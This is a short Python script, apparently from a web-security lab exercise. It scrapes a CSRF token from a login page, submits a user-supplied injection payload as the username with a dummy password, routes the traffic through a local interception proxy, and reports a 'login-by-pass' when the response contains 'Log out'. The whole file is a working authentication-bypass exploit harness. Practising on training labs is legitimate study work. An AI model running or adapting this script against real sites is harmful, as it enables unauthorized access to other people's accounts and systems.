import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def get_csrf(session, url):
    loginGETResponse = session.get(url, verify = False, proxies = proxies)
    soup = BeautifulSoup(loginGETResponse.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def username_matched(session, url, paylaod):
    # authentication require 3 fields - csrf, username, password
    # password and username you will enter 
    # CSRF - take it from the login page response from server.
    csrf = get_csrf(session, url);
    data = {
        'csrf' : csrf,
        'username' : payload,
        'password' : "randomValue"
    }
    postRequest = session.post(url, data=data, verify=False, proxies=proxies)

    responseBody = postRequest.text # resonse body

    if 'Log out' in responseBody: # check the body of repose for text "Log out" - if found injection successful
        return True
    else:
        return False
    
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print("[-] invalid inputs")
        print("[-] Usage: %s <url> <payload>" %sys.argv[0])
        sys.exit(-1)

    session = requests.Session()  # allow to persist some parameter accross multiple HTTP requests.
    # session jar is created in python memeory and later store cookies when GET request is made
    # print(session.cookies)
    
    if username_matched(session, url, payload):
        print('[+] successful login-by-passed')
    else:
        print("[-] login-by-pass failed")